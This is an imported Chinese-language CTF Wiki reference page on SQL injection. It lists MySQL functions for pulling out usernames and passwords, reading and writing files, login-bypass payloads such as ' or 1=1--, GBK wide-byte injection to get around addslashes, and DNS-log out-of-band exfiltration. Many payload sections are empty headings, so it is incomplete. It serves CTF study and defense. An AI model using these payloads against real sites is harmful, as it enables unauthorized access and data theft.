---
title: "SQL 注入"
category: web
tags: [licensed chinese reference]
signals: [SQL 注入, Burp, MySQL]
difficulty: medium
source: "https://github.com/ctf-wiki/ctf-wiki/blob/e225ddfcd420a7f54a5940f47336ebdf8c29b875/docs/zh-tw/docs/web/sqli.md"
tools: []
origin: imported
origin_id: ctf-wiki-304cd21a452777
origin_sha256: 32d7e04a9899cc3d585c99ea4bb36de232a033719d7678ad69113f920eb54052
origin_event: ""
origin_kind: licensed_chinese_reference
license: "CC-BY-NC-SA-4.0"
updated: 2026-10-23
---
# SQL 注入

> 来源：https://github.com/ctf-wiki/ctf-wiki/blob/e225ddfcd420a7f54a5940f47336ebdf8c29b875/docs/zh-tw/docs/web/sqli.md

# SQL 注入

## 基本概念

-   SQL 注入是一種將 SQL 代碼插入或添加到應用（用戶）的輸入參數中，之後再將這些參數傳遞給後臺的 SQL 服務器加以解析並執行的攻擊。
-   攻擊者能夠修改 SQL 語句，該進程將與執行命令的組件（如數據庫服務器、應用服務器或 WEB 服務器）擁有相同的權限。
-   如果 WEB 應用開發人員無法確保在將從 WEB 表單、cookie、輸入參數等收到的值傳遞給 SQL 查詢（該查詢在數據庫服務器上執行）之前已經對其進行過驗證，通常就會出現 SQL 注入漏洞。

## 常用工具

-   Burp Suite：[Burp Suite 使用介紹](http://drops.xmd5.com/static/drops/tools-1548.html)
-   Tamper Data (Firefox addon)
-   HackBar (Firefox addon)
-   sqlmap：[sqlmap 用戶手冊](http://drops.xmd5.com/static/drops/tips-143.html)

## 注入常見參數

-   `user()`：當前數據庫用戶
-   `database()`：當前數據庫名
-   `version()`：當前使用的數據庫版本
-   `@@datadir`：數據庫存儲數據路徑
-   `concat()`：聯合數據，用於聯合兩條數據結果。如 `concat(username,0x3a,password)`
-   `group_concat()`：和 `concat()` 類似，如 `group_concat(DISTINCT+user,0x3a,password)`，用於把多條數據一次注入出來
-   `concat_ws()`：用法類似
-   `hex()` 和 `unhex()`：用於 hex 編碼解碼
-   `load_file()`：以文本方式讀取文件，在 Windows 中，路徑設置爲 `\\`
-   `select xxoo into outfile '路徑'`：權限較高時可直接寫文件

## 語法參考與小技巧

### 行間註釋

-   `--`


-   `#`


### 行內註釋

-   `/*註釋內容*/`


-   `/*! MYSQL專屬 */`


### 字符串編碼

-   `ASCII()`：返回字符的 ASCII 碼值
-   `CHAR()`：把整數轉換爲對應的字符

## 後臺萬能密碼

-   `admin' --`
-   `admin' #`
-   `admin'/*`
-   `' or 1=1--`
-   `' or 1=1#`
-   `' or 1=1/*`
-   `') or '1'='1--`
-   `') or ('1'='1--`
-   以不同的用戶登陸 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

## 注入語句備忘

### 數據庫名


### 表名

-   union 查詢


-   盲注


-   報錯


### 列名

-   union 查詢


-   盲注


-   報錯


-   利用 `PROCEDURE ANALYSE()`


### 根據列名查詢所在的表


### 繞過引號限制


### 繞過字符串黑名單


使用 `CONCAT()` 時，任何個參數爲 null，將返回 null，推薦使用 `CONCAT_WS()`。`CONCAT_WS()`函數第一個參數表示用哪個字符間隔所查詢的結果。

### 條件語句

`CASE`, `IF()`, `IFNULL()`, `NULLIF()`.


### 延時函數

`SLEEP()`, `BENCHMARK()`.


### order by 後的注入

`order by` 由於是排序語句，所以可以利用條件語句做判斷，根據返回的排序結果不同判斷條件的真假。一般帶有 `order` 或者 `order by` 的變量很可能是這種注入，在知道一個字段的時候可以採用如下方式注入：

原始鏈接：`http://www.test.com/list.php?order=vote`

根據 `vote` 字段排序。找到投票數最大的票數 `num` 然後構造以下鏈接：


看排序是否變化。還有一種方法不需要知道任何字段信息，使用 `rand` 函數：


以上兩個會返回不同的排序，判斷表名中第一個字符是否小於 128 的語句如下：


### 寬字節注入

國內最常使用的 GBK 編碼，這種方式主要是繞過 `addslashes` 等對特殊字符進行轉移的繞過。反斜槓 `\` 的十六進製爲 `%5c`，在你輸入 `%bf%27` 時，函數遇到單引號自動轉移加入 `\`，此時變爲 `%bf%5c%27`，`%bf%5c`
在 GBK 中變爲一個寬字符「縗」。`%bf` 那個位置可以是 `%81-%fe` 中間的任何字符。不止在 SQL 注入中，寬字符注入在很多地方都可以應用。

### DNSLOG注入

**DNS在解析的時候會留下日誌，通過讀取多級域名的解析日誌，來獲取信息。簡單來說就是把信息放在高級域名中，傳遞到自己這，然後讀取日誌，獲取信息。**

dnslog平臺：[http://ceye.io/](http://ceye.io/)

〔原图省略〕

## 參考資料

-   [SQL 注入速查表](http://drops.xmd5.com/static/drops/tips-7840.html)
-   [MySQL 注入技巧](http://drops.xmd5.com/static/drops/tips-7299.html)
-   [MySQL 注入科普](http://drops.xmd5.com/static/drops/tips-123.html)
-   [MySQL 注入總結](http://www.91ri.org/4073.html)
-   [《SQL 注入攻擊與防禦》](http://product.dangdang.com/23364650.html)
